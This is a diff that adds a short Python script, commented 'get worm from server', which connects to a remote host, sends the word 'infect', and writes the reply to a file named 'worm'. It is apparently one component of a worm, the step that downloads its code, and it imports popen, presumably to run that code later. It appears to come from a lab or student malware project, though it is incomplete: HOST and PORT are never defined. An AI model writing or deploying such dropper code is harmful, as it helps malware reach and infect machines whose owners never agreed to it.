@@ -1,0 +1,17 @@
+# get worm from server
+import socket
+import time
+from os import popen
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+while True:
+    outdata = "infect"
+    s.send(outdata.encode())
+    indata = s.recv(1024)
+    break
+
+f = open("worm", "w")
+f.write(indata.decode())
+f.close()
